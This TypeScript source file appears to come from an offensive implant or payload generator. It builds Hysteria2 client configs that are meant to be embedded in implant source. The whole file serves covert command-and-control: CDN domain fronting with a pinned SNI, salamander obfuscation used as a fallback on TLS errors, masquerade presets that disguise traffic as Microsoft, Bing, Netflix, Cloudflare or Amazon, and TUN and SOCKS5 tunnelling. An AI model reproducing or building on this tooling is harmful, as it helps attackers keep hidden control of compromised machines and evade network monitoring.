import type { PayloadConfig } from "@/lib/payloads/generator"

const MASQUERADE_PRESETS: Record<string, string> = {
  microsoft: "https://www.microsoft.com",
  bing: "https://www.bing.com",
  netflix: "https://www.netflix.com",
  cloudflare: "https://www.cloudflare.com",
  amazon: "https://www.amazon.com",
}

export function masqueradePreset(domain: string): string {
  const key = domain.toLowerCase().replace(/^www\./, "").split(".")[0]
  return MASQUERADE_PRESETS[key] ?? `https://${domain}`
}

/**
 * Generate proper Hysteria2 client YAML for embedding in implant source.
 * Follows the Hysteria2 v2 config spec exactly.
 */
export function generateImplantConfigYAML(config: PayloadConfig): string {
  const h = config.hysteriaConfig
  const cdn = config.cdnFront

  // CDN fronting: connect to front domain, SNI = real host
  const serverAddr = cdn?.enabled && cdn.frontDomain ? cdn.frontDomain : h.server
  const hostForSni = h.server.includes(":") ? h.server.split(":")[0] : h.server
  const sni = cdn?.enabled && cdn.realHost ? cdn.realHost : (h.sni || hostForSni)

  const parts: string[] = []

  if (cdn?.enabled && cdn.frontDomain) {
    parts.push(`# CDN front: connecting via ${cdn.frontDomain}, SNI pinned to ${sni}`)
  }

  parts.push(
    `server: ${serverAddr}`,
    `auth: ${h.auth}`,
    ``,
    `tls:`,
    `  sni: ${sni}`,
    `  insecure: ${h.insecure ? "true" : "false"}`,
  )

  if (h.obfsType === "salamander" && h.obfsPassword) {
    parts.push(
      ``,
      `# Salamander obfs: implant probes without obfs first; falls back to this on TLS errors`,
      `obfs:`,
      `  type: salamander`,
      `  salamander:`,
      `    password: ${h.obfsPassword}`,
    )
  }

  if (h.bandwidthUp || h.bandwidthDown) {
    parts.push(``, `bandwidth:`)
    if (h.bandwidthUp) parts.push(`  up: ${h.bandwidthUp}`)
    if (h.bandwidthDown) parts.push(`  down: ${h.bandwidthDown}`)
  }

  if (h.masquerade) {
    const masqUrl = masqueradePreset(h.masquerade).startsWith("http")
      ? masqueradePreset(h.masquerade)
      : h.masquerade
    parts.push(``, `masquerade:`, `  type: proxy`, `  proxy:`, `    url: ${masqUrl}`, `    rewriteHost: true`)
  }

  if (h.tunEnabled) {
    parts.push(
      ``,
      `tun:`,
      `  enable: true`,
      `  stack: system`,
      `  mtu: 1500`,
      `  autoRoute: true`,
      `  strictRoute: true`,
      `  dns:`,
      `    listen: 127.0.0.1:5353`,
    )
  }

  if (h.socksListen) {
    parts.push(``, `socks5:`, `  listen: ${h.socksListen}`)
  }

  return parts.join("\n") + "\n"
}
